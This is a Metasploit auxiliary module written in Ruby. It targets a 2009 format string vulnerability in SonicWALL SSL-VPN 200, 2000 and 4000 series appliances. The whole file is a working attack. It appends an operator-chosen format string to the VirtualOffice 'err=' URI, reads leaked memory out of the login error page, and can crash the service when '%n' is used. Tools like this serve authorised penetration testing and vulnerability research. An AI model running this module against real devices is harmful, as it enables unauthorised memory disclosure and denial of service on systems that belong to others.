##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos # %n etc kills a thread, but otherwise ok.

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SonicWALL SSL-VPN Format String Vulnerability',
        'Description' => %q{
          There is a format string vulnerability within the SonicWALL
          SSL-VPN Appliance - 200, 2000 and 4000 series. Arbitrary memory
          can be read or written to, depending on the format string used.
          There appears to be a length limit of 127 characters of format
          string data. With physical access to the device and debugging,
          this module may be able to be used to execute arbitrary code remotely.
        },
        'Author' => [ 'aushack' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'BID', '35145' ],
          [ 'OSVDB', '54881' ],
          [ 'URL', 'http://www.aushack.com/200905-sonicwall.txt' ],
        ],
        'DisclosureDate' => '2009-05-29',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('URI', [ true, 'URI to request', '/cgi-bin/welcome/VirtualOffice?err=' ]),
      OptString.new('FORMAT', [ true, 'Format string (i.e. %x, %s, %n, %p etc)', '%x%x%x%x%x%x%x' ]),
      Opt::RPORT(443),
      OptBool.new('SSL', [true, 'Use SSL', true]),
    ])
  end

  def run
    if (datastore['FORMAT'].length > 125) # Max length is 127 bytes
      print_error('FORMAT string length cannot exceed 125 bytes.')
      return
    end

    fmt = datastore['FORMAT'] + 'XX' # XX is 2 bytes used to mark end of memory garbage for regexp
    begin
      res = send_request_raw({
        'uri' => normalize_uri(datastore['URI']) + fmt
      })

      if res && (res.code == 200)
        res.body.scan(/\<td class\=\"loginError\"\>(.+)XX/ism)
        print_status("Information leaked: #{::Regexp.last_match(1)}")
      end

      print_status("Request sent to #{rhost}:#{rport}")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_status("Couldn't connect to #{rhost}:#{rport}")
    rescue ::Timeout::Error, ::Errno::EPIPE => e
      vprint_error(e.message)
    end
  end
end
